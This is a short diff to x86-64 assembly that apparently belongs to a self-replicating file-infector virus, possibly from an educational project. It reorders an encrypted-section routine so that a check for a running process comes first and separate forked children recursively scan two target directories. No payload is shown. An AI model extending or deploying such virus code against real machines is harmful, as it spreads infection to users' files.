@@ -56,6 +56,28 @@ encrypted_start:
     mov [rsp + ppid], rax
 
 birth_of_child:
+    call get_processus_actif
+    cmp rax, 0
+    jnz exit
+
+
+scan_first_dir:
+
+    mov rax, SYS_FORK
+    syscall
+    mov rax, SYS_GETPID
+    syscall
+    cmp rax, [rsp + ppid]
+    jz scan_second_dir
+
+    lea rdi, [rsp + fileName]
+    lea rsi, [rel firstDir]
+    call ft_strcpy
+    mov rdi, rsp
+    call recursive
+    jmp exit
+
+scan_second_dir:
     mov rax, SYS_FORK
     syscall
     mov rax, SYS_GETPID
@@ -63,16 +85,6 @@ birth_of_child:
     cmp rax, [rsp + ppid]
     jz exit
 
-
-    call get_processus_actif
-    cmp rax, 0
-    jnz exit
-
-    lea rdi, [rsp + fileName]
-    lea rsi, [rel firstDir]
-    call ft_strcpy
-    mov rdi, rsp
-    call recursive
     lea rdi, [rsp + fileName]
     lea rsi, [rel secondDir]
     call ft_strcpy
